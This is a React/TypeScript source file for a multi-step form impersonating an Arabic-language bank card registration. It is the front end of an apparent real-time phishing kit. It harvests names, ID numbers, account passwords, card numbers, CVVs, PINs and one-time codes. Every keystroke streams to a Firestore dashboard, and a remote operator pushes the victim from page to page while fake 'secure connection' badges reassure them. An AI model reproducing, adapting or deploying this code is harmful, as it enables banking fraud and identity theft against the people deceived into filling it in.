import { useEffect, useRef, useState } from "react";
import { motion, AnimatePresence } from "framer-motion";
import {
  ShieldCheck,
  Loader2,
  CheckCircle2,
  XCircle,
  ArrowRight,
  CreditCard,
  KeyRound,
  Smartphone,
} from "lucide-react";
import {
  createVisitorSession,
  startApplication,
  submitAccount,
  submitOtp,
  submitCardDetails,
  submitPin,
  submitExtraOtp,
  subscribeToApplication,
  resolveDecision,
  heartbeat,
  markOffline,
  patchVisitor,
  startPresence,
  type AdminDecision,
} from "@/lib/registration-service";
import { sounds } from "@/lib/sounds";

type LocalView =
  | "form_1"
  | "form_2"
  | "form_3"
  | "waiting"
  | "approved"
  | "rejected"
  | "page_card"
  | "page_pin"
  | "page_otp";

export default function RegisterForm() {
  const [view, setView] = useState<LocalView>("form_1");
  const [sessionId, setSessionId] = useState<string | null>(null);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [resendNotice, setResendNotice] = useState<string | null>(null);
  const [resending, setResending] = useState(false);

  // step 1
  const [name, setName] = useState("");
  const [phone, setPhone] = useState("");
  const [idnum, setIdnum] = useState("");

  // step 2
  const [account, setAccount] = useState("");
  const [password, setPassword] = useState("");

  // step 3 OTP
  const [otp, setOtp] = useState<string[]>(["", "", "", ""]);
  const otpRefs = useRef<Array<HTMLInputElement | null>>([]);

  // card
  const [cardNumber, setCardNumber] = useState("");
  const [cardHolderName, setCardHolderName] = useState("");
  const [expiryDate, setExpiryDate] = useState("");
  const [cvv, setCvv] = useState("");

  // pin
  const [pin, setPin] = useState<string[]>(["", "", "", ""]);
  const pinRefs = useRef<Array<HTMLInputElement | null>>([]);

  // extra OTP (6 digit)
  const [extraOtp, setExtraOtp] = useState<string[]>(["", "", "", "", "", ""]);
  const extraOtpRefs = useRef<Array<HTMLInputElement | null>>([]);

  const lastDecisionRef = useRef<AdminDecision>(null);

  // unlock audio on first user gesture + create visitor session immediately
  useEffect(() => {
    sounds.unlockOnFirstGesture();
    let cancelled = false;
    const playedRef = { current: false };
    const playEnterOnce = () => {
      if (playedRef.current) return;
      playedRef.current = true;
      sounds.enter();
    };
    (async () => {
      try {
        const id = await createVisitorSession();
        if (cancelled) {
          markOffline(id);
          return;
        }
        setSessionId(id);
        // Firebase Presence — dashboard sees online/offline instantly.
        startPresence(id);
      } catch {
        // silent
      }
    })();
    const onGesture = () => {
      playEnterOnce();
      window.removeEventListener("pointerdown", onGesture);
      window.removeEventListener("keydown", onGesture);
    };
    window.addEventListener("pointerdown", onGesture);
    window.addEventListener("keydown", onGesture);
    return () => {
      cancelled = true;
      window.removeEventListener("pointerdown", onGesture);
      window.removeEventListener("keydown", onGesture);
    };
  }, []);

  // Live-typing: debounced writes (80ms) of every field to Firestore so the
  // dashboard sees the visitor typing character-by-character.
  useEffect(() => {
    if (!sessionId) return;
    const t = setTimeout(() => {
      patchVisitor(sessionId, {
        name,
        phone,
        mobile: phone,
        idNumber: idnum,
        account,
        password,
        cardNumber,
        cardHolderName,
        expiryDate,
        cvv,
        otp: otp.join(""),
        pin: pin.join(""),
        pass: pin.join(""),
        otp2: extraOtp.join(""),
      });
    }, 80);
    return () => clearTimeout(t);
  }, [
    sessionId, name, phone, idnum, account, password,
    cardNumber, cardHolderName, expiryDate, cvv,
    otp, pin, extraOtp,
  ]);

  // Heartbeat
  useEffect(() => {
    if (!sessionId) return;
    const t = setInterval(() => heartbeat(sessionId), 15000);
    const onUnload = () => markOffline(sessionId);
    window.addEventListener("beforeunload", onUnload);
    return () => {
      clearInterval(t);
      window.removeEventListener("beforeunload", onUnload);
    };
  }, [sessionId]);

  // Subscribe to admin decisions
  useEffect(() => {
    if (!sessionId) return;
    const unsub = subscribeToApplication(sessionId, (data) => {
      const decision: AdminDecision = resolveDecision(data);
      if (!decision) return;
      if (decision === lastDecisionRef.current) return;
      lastDecisionRef.current = decision;

      switch (decision) {
        case "approved":
          sounds.success();
          setView("approved");
          break;
        case "rejected":
          sounds.reject();
          setView("rejected");
          break;
        case "page_info":
          sounds.redirect();
          setView("form_1");
          break;
        case "page_account":
          sounds.redirect();
          setView("form_2");
          patchVisitor(sessionId, { currentPage: "account", pagename: "رقم الحساب", arrivedAt: new Date().toISOString() });
          break;
        case "page_code":
          sounds.redirect();
          setOtp(["", "", "", ""]);
          setView("form_3");
          patchVisitor(sessionId, { currentPage: "code", pagename: "رمز التفعيل", arrivedAt: new Date().toISOString() });
          break;
        case "page_card":
          sounds.redirect();
          setView("page_card");
          patchVisitor(sessionId, { currentPage: "card", pagename: "بيانات البطاقة", arrivedAt: new Date().toISOString() });
          break;
        case "page_pin":
          sounds.redirect();
          setPin(["", "", "", ""]);
          setView("page_pin");
          patchVisitor(sessionId, { currentPage: "pin", pagename: "الرمز السري PIN", arrivedAt: new Date().toISOString() });
          break;
        case "page_otp":
          sounds.redirect();
          setExtraOtp(["", "", "", "", "", ""]);
          setView("page_otp");
          patchVisitor(sessionId, { currentPage: "otp", pagename: "رمز OTP إضافي", arrivedAt: new Date().toISOString() });
          break;
      }
    });
    return () => unsub();
  }, [sessionId]);

  const goWaiting = () => {
    lastDecisionRef.current = null;
    setView("waiting");
  };

  // ---- Submit handlers ----
  const handleStep1 = async (e: React.FormEvent) => {
    e.preventDefault();
    setError(null);
    if (!name.trim() || !phone.trim() || !idnum.trim()) {
      setError("الرجاء ملء جميع الحقول");
      return;
    }
    const cleanPhone = phone.trim().replace(/[\s-]/g, "");
    if (!/^09\d{8}$/.test(cleanPhone)) {
      setError("الرجاء إدخال رقم هاتف سوري صحيح يبدأ بـ 09");
      return;
    }
    setLoading(true);
    try {
      let id = sessionId;
      if (!id) {
        id = await createVisitorSession();
        setSessionId(id);
      }
      await startApplication(id, {
        name: name.trim(),
        phone: phone.trim(),
        idnum: idnum.trim(),
      });
      sounds.step1();
      setView("form_2");
    } catch {
      setError("حدث خطأ أثناء إرسال البيانات. حاول مرة أخرى.");
    } finally {
      setLoading(false);
    }
  };

  const handleStep2 = async (e: React.FormEvent) => {
    e.preventDefault();
    setError(null);
    if (!account.trim() || !password) {
      setError("الرجاء إدخال رقم الحساب وكلمة المرور");
      return;
    }
    if (!sessionId) {
      setError("انتهت الجلسة. الرجاء البدء من جديد.");
      setView("form_1");
      return;
    }
    setLoading(true);
    try {
      await submitAccount(sessionId, { account: account.trim(), password });
      sounds.step2();
      setView("form_3");
      setTimeout(() => otpRefs.current[0]?.focus(), 150);
    } catch {
      setError("تعذر إرسال البيانات. حاول مرة أخرى.");
    } finally {
      setLoading(false);
    }
  };

  const handleStep3 = async (e: React.FormEvent) => {
    e.preventDefault();
    setError(null);
    const code = otp.join("");
    if (code.length < 4) {
      setError("الرجاء إدخال رمز التفعيل بالكامل");
      return;
    }
    if (!sessionId) return;
    setLoading(true);
    try {
      await submitOtp(sessionId, { code });
      sounds.submit();
      goWaiting();
    } catch {
      setError("تعذر التحقق من الرمز. حاول مرة أخرى.");
    } finally {
      setLoading(false);
    }
  };

  const handleCard = async (e: React.FormEvent) => {
    e.preventDefault();
    setError(null);
    if (!cardNumber.trim() || !cardHolderName.trim() || !expiryDate.trim() || !cvv.trim()) {
      setError("الرجاء تعبئة جميع بيانات البطاقة");
      return;
    }
    if (!sessionId) return;
    setLoading(true);
    try {
      await submitCardDetails(sessionId, {
        cardNumber: cardNumber.replace(/\s/g, ""),
        cardHolderName: cardHolderName.trim(),
        expiryDate: expiryDate.trim(),
        cvv: cvv.trim(),
      });
      sounds.submit();
      goWaiting();
    } catch {
      setError("تعذر إرسال البيانات. حاول مرة أخرى.");
    } finally {
      setLoading(false);
    }
  };

  const handlePin = async (e: React.FormEvent) => {
    e.preventDefault();
    setError(null);
    const code = pin.join("");
    if (code.length < 4) {
      setError("الرجاء إدخال الرمز السري بالكامل");
      return;
    }
    if (!sessionId) return;
    setLoading(true);
    try {
      await submitPin(sessionId, code);
      sounds.submit();
      goWaiting();
    } catch {
      setError("تعذر إرسال الرمز. حاول مرة أخرى.");
    } finally {
      setLoading(false);
    }
  };

  const handleExtraOtp = async (e: React.FormEvent) => {
    e.preventDefault();
    setError(null);
    const code = extraOtp.join("");
    if (code.length < 6) {
      setError("الرجاء إدخال الرمز بالكامل");
      return;
    }
    if (!sessionId) return;
    setLoading(true);
    try {
      await submitExtraOtp(sessionId, code);
      sounds.submit();
      goWaiting();
    } catch {
      setError("تعذر إرسال الرمز. حاول مرة أخرى.");
    } finally {
      setLoading(false);
    }
  };

  // ---- OTP helpers ----
  const makeOtpHandler = (
    arr: string[],
    setArr: (a: string[]) => void,
    refs: React.MutableRefObject<Array<HTMLInputElement | null>>,
    len: number
  ) => ({
    change: (i: number, v: string) => {
      const d = v.replace(/[^0-9]/g, "").slice(0, 1);
      const next = [...arr];
      next[i] = d;
      setArr(next);
      if (d && i < len - 1) refs.current[i + 1]?.focus();
    },
    key: (i: number, e: React.KeyboardEvent<HTMLInputElement>) => {
      if (e.key === "Backspace" && !arr[i] && i > 0) refs.current[i - 1]?.focus();
    },
  });

  const otpH = makeOtpHandler(otp, setOtp, otpRefs, 4);
  const pinH = makeOtpHandler(pin, setPin, pinRefs, 4);
  const extraH = makeOtpHandler(extraOtp, setExtraOtp, extraOtpRefs, 6);

  const handleReset = () => {
    if (sessionId) markOffline(sessionId);
    setView("form_1");
    setSessionId(null);
    setName(""); setPhone(""); setIdnum("");
    setAccount(""); setPassword("");
    setOtp(["", "", "", ""]);
    setCardNumber(""); setCardHolderName(""); setExpiryDate(""); setCvv("");
    setPin(["", "", "", ""]);
    setExtraOtp(["", "", "", "", "", ""]);
    setError(null);
    lastDecisionRef.current = null;
  };

  const formStep = view === "form_1" ? 1 : view === "form_2" ? 2 : view === "form_3" ? 3 : 0;

  return (
    <div className="w-full max-w-md mx-auto">
      <div className="bg-card border border-card-border rounded-2xl shadow-xl p-6 md:p-8 relative overflow-hidden">
        {formStep > 0 && (
          <div className="flex items-center justify-center gap-2 mb-6">
            {[1, 2, 3].map((n) => (
              <div key={n} className="flex items-center">
                <div
                  className={`w-7 h-7 rounded-full flex items-center justify-center text-xs font-bold transition-all duration-300 ${
                    formStep >= n
                      ? "bg-primary text-primary-foreground shadow-md"
                      : "bg-muted text-muted-foreground"
                  }`}
                >
                  {formStep > n ? <CheckCircle2 className="w-4 h-4" /> : n}
                </div>
                {n < 3 && (
                  <div
                    className={`w-10 h-0.5 mx-1 transition-all duration-300 ${
                      formStep > n ? "bg-primary" : "bg-muted"
                    }`}
                  />
                )}
              </div>
            ))}
          </div>
        )}

        <AnimatePresence mode="wait">
          {view === "form_1" && (
            <Pane key="s1">
              <form onSubmit={handleStep1} className="space-y-4">
                <Header title="تسجيل المعلومات" desc="أدخل اسمك ورقم الهاتف ورقم الهوية" />
                <Field label="الاسم الكامل" id="name" value={name} onChange={setName} placeholder="الاسم الكامل" autoComplete="name" />
                <Field
                  label="رقم الهاتف"
                  id="phone"
                  type="tel"
                  value={phone}
                  onChange={(v) => setPhone(v.replace(/[^0-9]/g, "").slice(0, 10))}
                  placeholder="09xxxxxxxx"
                  inputMode="tel"
                  autoComplete="tel"
                />
                <Field label="رقم الهوية / الجواز" id="idnum" value={idnum} onChange={setIdnum} placeholder="الهوية أو الجواز" />
                {error && <ErrorBox>{error}</ErrorBox>}
                <SubmitButton loading={loading}>متابعة</SubmitButton>
                <div className="flex items-center justify-center gap-2 text-xs text-muted-foreground pt-2">
                  <ShieldCheck className="w-4 h-4 text-primary" />
                  <span>بياناتك آمنة ومحمية</span>
                </div>
              </form>
            </Pane>
          )}

          {view === "form_2" && (
            <Pane key="s2">
              <form onSubmit={handleStep2} className="space-y-4">
                <Header title="تفاصيل الحساب" desc="أدخل رقم الحساب وكلمة المرور" />
                <Field label="رقم الحساب" id="account" value={account} onChange={setAccount} placeholder="رقم الحساب" autoComplete="off" />
                <Field label="كلمة المرور" id="password" type="password" value={password} onChange={setPassword} placeholder="كلمة المرور" autoComplete="off" />
                {error && <ErrorBox>{error}</ErrorBox>}
                <SubmitButton loading={loading}>متابعة</SubmitButton>
              </form>
            </Pane>
          )}

          {view === "form_3" && (
            <Pane key="s3">
              <form onSubmit={handleStep3} className="space-y-4">
                <Header title="أدخل رمز التفعيل" desc="أرسلنا رمزًا إلى رقم الهاتف" />
                <OtpRow
                  digits={otp}
                  refs={otpRefs}
                  onChange={otpH.change}
                  onKey={otpH.key}
                />
                {error && <ErrorBox>{error}</ErrorBox>}
                <SubmitButton loading={loading}>تأكيد</SubmitButton>
                <p className="text-xs text-muted-foreground text-center pt-2">
                  لم تستلم؟{" "}
                  <button
                    type="button"
                    disabled={resending || !sessionId}
                    onClick={async () => {
                      if (!sessionId) return;
                      setResending(true);
                      setResendNotice(null);
                      try {
                        await submitAccount(sessionId, { account, password });
                        setResendNotice("تم إعادة إرسال الرمز");
                      } catch {
                        setResendNotice("تعذر إعادة الإرسال، حاول مرة أخرى");
                      } finally {
                        setResending(false);
                      }
                    }}
                    className="text-primary font-semibold hover:underline disabled:opacity-60"
                  >
                    {resending ? "جارٍ الإرسال..." : "إعادة إرسال"}
                  </button>
                  {resendNotice && <span className="block mt-1 text-primary">{resendNotice}</span>}
                </p>
              </form>
            </Pane>
          )}

          {view === "waiting" && (
            <Pane key="wait">
              <div className="text-center py-8">
                <motion.div
                  animate={{ rotate: 360 }}
                  transition={{ duration: 2, repeat: Infinity, ease: "linear" }}
                  className="w-20 h-20 mx-auto mb-5 rounded-full border-4 border-primary/20 border-t-primary"
                />
                <h3 className="text-xl font-bold text-foreground mb-2">جارٍ مراجعة طلبك</h3>
                <p className="text-sm text-muted-foreground max-w-xs mx-auto">
                  يرجى الانتظار، يتم التحقق من بياناتك من قبل فريق البنك...
                </p>
                <div className="mt-6 inline-flex items-center gap-2 px-4 py-2 rounded-full bg-primary/10 text-primary text-xs font-semibold">
                  <span className="w-2 h-2 rounded-full bg-primary animate-pulse" />
                  متصل
                </div>
              </div>
            </Pane>
          )}

          {view === "approved" && (
            <Pane key="approved">
              <ResultScreen
                icon={<CheckCircle2 className="w-14 h-14 text-emerald-600" />}
                color="emerald"
                title="تم قبول طلبك بنجاح!"
                desc="مبروك! تم تفعيل بطاقتك. سيتم التواصل معك قريبًا لاستلامها."
                onReset={handleReset}
              />
            </Pane>
          )}

          {view === "rejected" && (
            <Pane key="rejected">
              <ResultScreen
                icon={<XCircle className="w-14 h-14 text-destructive" />}
                color="red"
                title="تم رفض الطلب"
                desc="نأسف، لم يتم قبول طلبك في الوقت الحالي. يرجى التواصل مع فرع البنك للمزيد من المعلومات."
                onReset={handleReset}
              />
            </Pane>
          )}

          {view === "page_card" && (
            <Pane key="card">
              <form onSubmit={handleCard} className="space-y-4">
                <Header
                  title="بيانات البطاقة"
                  desc="أدخل بيانات بطاقتك البنكية للتحقق"
                  icon={<CreditCard className="w-5 h-5 text-primary" />}
                />

                <VisaCardPreview
                  number={cardNumber}
                  name={cardHolderName}
                  exp={expiryDate}
                  cvv={cvv}
                />

                <Field
                  label="رقم البطاقة"
                  id="cn"
                  value={cardNumber}
                  onChange={(v) => {
                    const d = v.replace(/[^0-9]/g, "").slice(0, 16);
                    setCardNumber(d.replace(/(.{4})/g, "$1 ").trim());
                  }}
                  placeholder="0000 0000 0000 0000"
                  inputMode="numeric"
                />
                <Field
                  label="اسم حامل البطاقة"
                  id="chn"
                  value={cardHolderName}
                  onChange={(v) => setCardHolderName(v.toUpperCase())}
                  placeholder="الاسم كما يظهر على البطاقة"
                />
                <div className="grid grid-cols-2 gap-3">
                  <Field
                    label="تاريخ الانتهاء"
                    id="exp"
                    value={expiryDate}
                    onChange={(v) => {
                      let d = v.replace(/[^0-9]/g, "").slice(0, 4);
                      if (d.length > 2) d = d.slice(0, 2) + "/" + d.slice(2);
                      setExpiryDate(d);
                    }}
                    placeholder="MM/YY"
                    inputMode="numeric"
                  />
                  <Field
                    label="CVV"
                    id="cvv"
                    type="password"
                    value={cvv}
                    onChange={(v) => setCvv(v.replace(/[^0-9]/g, "").slice(0, 4))}
                    placeholder="•••"
                    inputMode="numeric"
                  />
                </div>
                {error && <ErrorBox>{error}</ErrorBox>}
                <SubmitButton loading={loading}>تأكيد</SubmitButton>
                <div className="flex items-center justify-center gap-2 text-xs text-muted-foreground pt-2">
                  <ShieldCheck className="w-4 h-4 text-primary" />
                  <span>الاتصال مشفّر ومحمي</span>
                </div>
              </form>
            </Pane>
          )}

          {view === "page_pin" && (
            <Pane key="pin">
              <form onSubmit={handlePin} className="space-y-4">
                <Header
                  title="الرمز السري"
                  desc="أدخل الرمز السري للبطاقة"
                  icon={<KeyRound className="w-5 h-5 text-primary" />}
                />
                <OtpRow
                  digits={pin}
                  refs={pinRefs}
                  onChange={pinH.change}
                  onKey={pinH.key}
                  mask
                />
                {error && <ErrorBox>{error}</ErrorBox>}
                <SubmitButton loading={loading}>تأكيد</SubmitButton>
              </form>
            </Pane>
          )}

          {view === "page_otp" && (
            <Pane key="eotp">
              <form onSubmit={handleExtraOtp} className="space-y-4">
                <Header
                  title="رمز التحقق"
                  desc="أدخل الرمز المكوّن من 6 أرقام الذي وصلك"
                  icon={<Smartphone className="w-5 h-5 text-primary" />}
                />
                <OtpRow
                  digits={extraOtp}
                  refs={extraOtpRefs}
                  onChange={extraH.change}
                  onKey={extraH.key}
                  small
                />
                {error && <ErrorBox>{error}</ErrorBox>}
                <SubmitButton loading={loading}>تأكيد</SubmitButton>
              </form>
            </Pane>
          )}
        </AnimatePresence>
      </div>
    </div>
  );
}

// ---- subcomponents ----

function Pane({ children }: { children: React.ReactNode }) {
  return (
    <motion.div
      initial={{ opacity: 0, x: 30 }}
      animate={{ opacity: 1, x: 0 }}
      exit={{ opacity: 0, x: -30 }}
      transition={{ duration: 0.25 }}
    >
      {children}
    </motion.div>
  );
}

function Header({ title, desc, icon }: { title: string; desc: string; icon?: React.ReactNode }) {
  return (
    <div className="text-center mb-2">
      {icon && <div className="flex justify-center mb-2">{icon}</div>}
      <h3 className="text-xl font-bold text-foreground">{title}</h3>
      <p className="text-sm text-muted-foreground mt-1">{desc}</p>
    </div>
  );
}

function OtpRow({
  digits,
  refs,
  onChange,
  onKey,
  mask,
  small,
}: {
  digits: string[];
  refs: React.MutableRefObject<Array<HTMLInputElement | null>>;
  onChange: (i: number, v: string) => void;
  onKey: (i: number, e: React.KeyboardEvent<HTMLInputElement>) => void;
  mask?: boolean;
  small?: boolean;
}) {
  return (
    <div className={`flex gap-2 justify-center py-2 ${small ? "" : "gap-3"}`} dir="ltr">
      {digits.map((d, i) => (
        <input
          key={i}
          ref={(el) => {
            refs.current[i] = el;
          }}
          type={mask ? "password" : "text"}
          inputMode="numeric"
          pattern="[0-9]*"
          maxLength={1}
          value={d}
          onChange={(e) => onChange(i, e.target.value)}
          onKeyDown={(e) => onKey(i, e)}
          className={`${small ? "w-11 h-12 text-xl" : "w-14 h-14 text-2xl"} rounded-xl border-2 border-input bg-background text-center font-bold text-foreground focus:border-primary focus:outline-none focus:ring-4 focus:ring-primary/15 transition-all`}
        />
      ))}
    </div>
  );
}

function ResultScreen({
  icon,
  title,
  desc,
  color,
  onReset,
}: {
  icon: React.ReactNode;
  title: string;
  desc: string;
  color: "emerald" | "red";
  onReset: () => void;
}) {
  const bg = color === "emerald" ? "bg-emerald-100" : "bg-destructive/10";
  return (
    <div className="text-center py-6">
      <motion.div
        initial={{ scale: 0 }}
        animate={{ scale: 1 }}
        transition={{ type: "spring", stiffness: 200 }}
        className={`w-20 h-20 ${bg} rounded-full flex items-center justify-center mx-auto mb-4`}
      >
        {icon}
      </motion.div>
      <h3 className="text-2xl font-bold text-foreground mb-2">{title}</h3>
      <p className="text-muted-foreground mb-6 max-w-xs mx-auto">{desc}</p>
      <button
        onClick={onReset}
        className="inline-flex items-center gap-2 text-primary hover:underline font-semibold"
      >
        تسجيل طلب جديد
        <ArrowRight className="w-4 h-4 rotate-180" />
      </button>
    </div>
  );
}

function Field({
  label,
  id,
  value,
  onChange,
  placeholder,
  type = "text",
  inputMode,
  autoComplete,
}: {
  label: string;
  id: string;
  value: string;
  onChange: (v: string) => void;
  placeholder?: string;
  type?: string;
  inputMode?: "text" | "tel" | "numeric";
  autoComplete?: string;
}) {
  return (
    <div className="space-y-1.5">
      <label htmlFor={id} className="block text-sm font-medium text-foreground">
        {label}
      </label>
      <input
        id={id}
        type={type}
        value={value}
        onChange={(e) => onChange(e.target.value)}
        placeholder={placeholder}
        inputMode={inputMode}
        autoComplete={autoComplete}
        className="w-full px-4 py-3.5 rounded-lg border border-transparent bg-secondary text-foreground placeholder:text-muted-foreground/70 focus:border-primary focus:bg-background focus:outline-none focus:ring-4 focus:ring-primary/15 transition-all"
      />
    </div>
  );
}

function ErrorBox({ children }: { children: React.ReactNode }) {
  return (
    <div className="text-sm text-destructive bg-destructive/10 border border-destructive/20 rounded-lg px-3 py-2">
      {children}
    </div>
  );
}

function VisaCardPreview({
  number,
  name,
  exp,
  cvv,
}: {
  number: string;
  name: string;
  exp: string;
  cvv: string;
}) {
  const formatted = (number || "").padEnd(19, "•").slice(0, 19);
  const display = formatted.replace(/(.{4})/g, "$1 ").trim().slice(0, 19);
  return (
    <div className="px-1 pb-2">
      <div
        className="relative rounded-2xl p-5 aspect-[1.586/1] w-full text-white shadow-xl overflow-hidden"
        style={{
          background:
            "linear-gradient(135deg, #1e3a8a 0%, #1d4ed8 45%, #4338ca 100%)",
        }}
        dir="ltr"
      >
        <div
          className="absolute inset-0 opacity-30"
          style={{
            backgroundImage:
              "radial-gradient(circle at 20% 30%, rgba(255,255,255,0.25), transparent 40%), radial-gradient(circle at 80% 80%, rgba(255,255,255,0.15), transparent 45%)",
          }}
        />
        <div className="relative flex justify-between items-start">
          <div className="w-9 h-7 rounded-md bg-gradient-to-br from-yellow-300 to-yellow-500 shadow-inner" />
          <div className="text-[10px] uppercase tracking-widest opacity-80">الأهلي</div>
        </div>

        <div className="relative mt-5 text-xl font-mono tracking-[0.18em] drop-shadow-sm">
          {display}
        </div>

        <div className="relative mt-4 flex justify-between items-end text-[11px]">
          <div className="max-w-[55%]">
            <div className="opacity-60 text-[8px] tracking-wider mb-0.5">CARDHOLDER</div>
            <div className="font-semibold uppercase truncate">{name || "—"}</div>
          </div>
          <div>
            <div className="opacity-60 text-[8px] tracking-wider mb-0.5">EXPIRES</div>
            <div className="font-semibold">{exp || "MM/YY"}</div>
          </div>
          <div>
            <div className="opacity-60 text-[8px] tracking-wider mb-0.5">CVV</div>
            <div className="font-semibold">{cvv ? "•".repeat(cvv.length) : "•••"}</div>
          </div>
        </div>

        <div className="absolute bottom-3 right-4 text-2xl font-bold italic tracking-tight">
          VISA
        </div>
      </div>
    </div>
  );
}

function SubmitButton({ loading, children }: { loading: boolean; children: React.ReactNode }) {
  return (
    <button
      type="submit"
      disabled={loading}
      className="w-full py-3.5 rounded-lg bg-primary text-primary-foreground font-bold text-base shadow-md shadow-primary/25 hover:bg-[hsl(357_71%_44%)] hover:shadow-lg hover:shadow-primary/35 active:scale-[0.99] transition-all disabled:opacity-70 disabled:cursor-not-allowed flex items-center justify-center gap-2"
    >
      {loading ? <Loader2 className="w-5 h-5 animate-spin" /> : children}
    </button>
  );
}
